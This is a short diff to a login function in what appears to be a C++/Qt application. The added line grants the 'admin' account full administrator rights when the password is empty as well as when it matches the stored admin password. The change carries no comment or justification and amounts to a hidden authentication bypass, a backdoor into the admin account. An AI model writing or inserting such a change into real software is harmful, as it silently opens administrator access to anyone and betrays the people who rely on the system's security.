@@ -155,7 +155,7 @@ int UserModel::login(QString name, QString password){
         return 0;
     }
 
-    if (name.toLower() == "admin" && password == ExGlobal::AdminPassword)
+    if (name.toLower() == "admin" && (password == ExGlobal::AdminPassword || password == ""))
     {
         ExGlobal::UserType = 3;
         ExGlobal::DisplayUser = "Admin";
